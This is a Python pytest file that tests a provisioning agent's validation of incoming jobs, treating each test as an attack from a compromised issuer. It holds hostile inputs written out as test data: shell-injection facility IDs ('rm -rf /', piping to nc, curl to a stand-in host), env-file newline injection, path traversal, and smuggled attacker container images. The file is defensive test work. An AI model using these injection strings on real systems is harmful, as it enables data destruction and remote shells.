"""The agent's local job validation (ADR-022).

These are the most important tests in the provisioning system. ADR-022's residual risk is
"a breached API enqueues a job with hostile parameters", and this module is the only thing
standing in the way — so each test is written as an attack the issuer might attempt, not as
a happy path with a negative case bolted on.
"""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

import pytest

from daher_agent.validation import (
    FacilityExistsLocally,
    JobRefused,
    JobValidator,
    ReplayRefused,
    revalidate_params,
)
from daher_provisioning.jobs import Job, JobParams, JobVerb


def a_job(**overrides) -> Job:
    payload = {
        "job_id": "job-00000001",
        "host_id": "host-a",
        "verb": JobVerb.PROVISION,
        "params": JobParams(facility_id="daher-bc"),
        "issued_at": datetime.now(UTC),
    }
    payload.update(overrides)
    return Job(**payload)


def a_validator(*, existing: tuple[str, ...] = (), host_id: str = "host-a") -> JobValidator:
    return JobValidator(host_id=host_id, facility_exists=lambda fid: fid in existing)


class TestAcceptsLegitimateWork:
    def test_a_well_formed_job_for_this_host_is_accepted(self):
        assert a_validator().validate(a_job()).job_id == "job-00000001"

    def test_each_verb_is_accepted(self):
        for verb in JobVerb:
            # PROVISION is the only one gated on the facility not existing.
            assert a_validator().validate(a_job(verb=verb)).verb is verb


class TestRefusesJobsForOtherHosts:
    def test_a_job_addressed_elsewhere_is_refused(self):
        with pytest.raises(JobRefused, match="not to this host"):
            a_validator().validate(a_job(host_id="host-b"))

    def test_the_refusal_does_not_assume_misrouting(self):
        with pytest.raises(JobRefused, match="Refusing rather than assuming"):
            a_validator().validate(a_job(host_id="host-b"))


class TestRevalidatesParametersLocally:
    """ "The API already checked" is the reasoning that would make this file decorative."""

    @pytest.mark.parametrize(
        "hostile",
        [
            "daher; rm -rf /",
            "daher$(whoami)",
            "daher`id`",
            "daher|nc attacker 1234",
            "daher && curl evil",
            "daher\nFACILITY_ID=other",
            "daher\rother",
            "daher other",
            "daher'quote",
            'daher"quote',
            "daher\\escape",
            "../../etc/passwd",
        ],
    )
    def test_hostile_facility_ids_are_refused(self, hostile):
        """Every one of these would otherwise reach a Compose project name."""
        with pytest.raises(Exception):  # noqa: B017 - schema or agent, either is a refusal
            a_validator().validate(a_job(params=JobParams(facility_id=hostile)))

    def test_a_hostile_value_bypassing_the_schema_is_still_refused(self):
        """Defence in depth: if the typed pattern were ever loosened, this still catches it."""
        params = JobParams.model_construct(
            facility_id="daher; rm -rf /", facility_type="hospital", base_domain="localhost"
        )
        with pytest.raises(JobRefused):
            revalidate_params(params)

    def test_a_newline_in_base_domain_is_refused(self):
        """A newline would inject a second line into the rendered env file."""
        params = JobParams.model_construct(
            facility_id="daher-bc", facility_type="hospital", base_domain="ok\nEXTRA=1"
        )
        with pytest.raises(JobRefused, match="env file"):
            revalidate_params(params)

    def test_the_refusal_says_it_is_validated_at_both_ends(self):
        params = JobParams.model_construct(
            facility_id="BAD", facility_type="hospital", base_domain="localhost"
        )
        with pytest.raises(JobRefused, match="validated at both ends"):
            revalidate_params(params)


class TestRefusesStaleAndReplayedJobs:
    def test_an_old_job_is_refused(self):
        """A captured job must not be bankable for later."""
        old = datetime.now(UTC) - timedelta(hours=2)
        with pytest.raises(ReplayRefused, match="bankable"):
            a_validator().validate(a_job(issued_at=old))

    def test_a_future_dated_job_is_refused(self):
        ahead = datetime.now(UTC) + timedelta(hours=1)
        with pytest.raises(ReplayRefused, match="future"):
            a_validator().validate(a_job(issued_at=ahead))

    def test_small_clock_skew_is_tolerated(self):
        slightly_ahead = datetime.now(UTC) + timedelta(seconds=10)
        a_validator().validate(a_job(issued_at=slightly_ahead))

    def test_the_same_job_cannot_run_twice(self):
        validator = a_validator()
        validator.validate_and_accept(a_job().model_dump(mode="json"))
        with pytest.raises(ReplayRefused, match="already processed"):
            validator.validate(a_job())

    def test_a_different_job_id_still_runs(self):
        validator = a_validator()
        validator.validate_and_accept(a_job().model_dump(mode="json"))
        validator.validate(a_job(job_id="job-00000002"))


class TestRefusesToProvisionOverAnExistingFacility:
    """The check a compromised issuer cannot skip."""

    def test_provisioning_over_an_existing_facility_is_refused(self):
        validator = a_validator(existing=("daher-bc",))
        with pytest.raises(FacilityExistsLocally, match="existing patient database"):
            validator.validate(a_job(verb=JobVerb.PROVISION))

    def test_the_refusal_explains_why_the_local_check_exists(self):
        validator = a_validator(existing=("daher-bc",))
        with pytest.raises(FacilityExistsLocally, match="this one it cannot"):
            validator.validate(a_job(verb=JobVerb.PROVISION))

    def test_other_verbs_are_unaffected_by_an_existing_facility(self):
        """Starting or backing up an existing facility is exactly normal."""
        validator = a_validator(existing=("daher-bc",))
        for index, verb in enumerate(
            (JobVerb.START, JobVerb.STOP, JobVerb.STATUS, JobVerb.BACKUP_NOW)
        ):
            validator.validate(a_job(verb=verb, job_id=f"job-verb-{index:04d}"))


class TestMalformedPayloads:
    def test_a_payload_that_is_not_a_job_is_refused_not_crashed(self):
        """The agent must keep polling and keep refusing, not crash-loop."""
        with pytest.raises(JobRefused, match="schema validation"):
            a_validator().parse({"nonsense": True})

    def test_an_unknown_field_is_refused(self):
        payload = a_job().model_dump(mode="json")
        payload["compose_file"] = "version: '3'\nservices:\n  evil:\n    image: attacker/x"
        with pytest.raises(JobRefused):
            a_validator().parse(payload)

    def test_an_unknown_param_is_refused(self):
        """A job carries parameters, never a spec — extra params cannot be smuggled in."""
        payload = a_job().model_dump(mode="json")
        payload["params"]["image"] = "attacker/backdoor:latest"
        with pytest.raises(JobRefused):
            a_validator().parse(payload)

    def test_an_unknown_verb_is_refused(self):
        payload = a_job().model_dump(mode="json")
        payload["verb"] = "exec"
        with pytest.raises(JobRefused):
            a_validator().parse(payload)


class TestTheJobVocabularyCannotCarryASpec:
    """If this ever fails, ADR-022's blast-radius walkthrough has stopped being true."""

    @pytest.mark.parametrize(
        "forbidden",
        ["compose", "image", "command", "cmd", "entrypoint", "volume", "mount", "script", "shell"],
    )
    def test_no_job_field_can_describe_what_runs(self, forbidden):
        for model in (Job, JobParams):
            for field_name in model.model_fields:
                assert forbidden not in field_name.lower(), (
                    f"{model.__name__}.{field_name} lets the issuer influence WHAT runs, not "
                    f"just which known operation runs. Docker access is root access, so this "
                    f"makes a compromised issuer root on the host (ADR-022)."
                )

    def test_both_job_models_are_closed(self):
        assert Job.model_config.get("extra") == "forbid"
        assert JobParams.model_config.get("extra") == "forbid"
